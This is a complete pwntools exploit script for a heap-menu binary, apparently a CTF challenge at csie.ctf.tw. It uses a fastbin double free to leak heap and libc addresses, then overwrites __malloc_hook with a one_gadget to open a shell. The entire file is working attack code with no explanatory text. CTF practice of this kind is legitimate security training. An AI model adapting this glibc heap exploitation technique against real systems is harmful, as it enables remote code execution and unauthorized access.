#!/usr/bin/python
from pwn import *

host = 'localhost'
port = 4000
host = 'csie.ctf.tw'
port = 10133
context.arch = 'amd64'
r = remote(host, port)

def add(size, content):
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    if(len(content) == size):
        r.send(content)
    else:
        r.sendline(content)

def show(idx):
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil(': ')
    r.sendline(str(idx))
    ret = r.recvuntil('1. new')[:-6].strip()
    return ret

def free(idx):
    r.recvuntil('>')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))

__malloc_hook = 0x3c3b10
stdout_base = 0x03c4620
one_gadget = 0xef6c4

add(0x68, 'a') # 0
add(0x68, 'a') # 1

free(1)
free(0)
free(1)

ret = show(0)
print (ret)
print (len(ret))
heap = u64(ret.strip().ljust(8, '\x00')) - 0x70
print ('heap : ', hex(heap))

add(0x68, p64(0x601ff5)) # 2
add(0x68, 'a') # 3
add(0x68, 'a') # 4
add(0x68, 'a'*0x1a) # 5
ret = show(5)
stdout = u64(ret.strip()[0x1b:].ljust(8, '\x00'))
print ('stdout : ', hex(stdout))
libc = stdout - stdout_base
print ('libc base : ', hex(libc))
__malloc_hook += libc
print ('__malloc_hook : ', hex(__malloc_hook))
one_gadget += libc
print ('one_gadget : ', hex(one_gadget))

free(1)
free(0)
free(1)
add(0x68, p64(__malloc_hook-0x1b-0x8)) # 6
add(0x68, 'a') # 7
add(0x68, 'a') # 8
add(0x68, 'aaa' + flat([0, 0, one_gadget])) # 9

free(0)
free(0)

r.interactive()
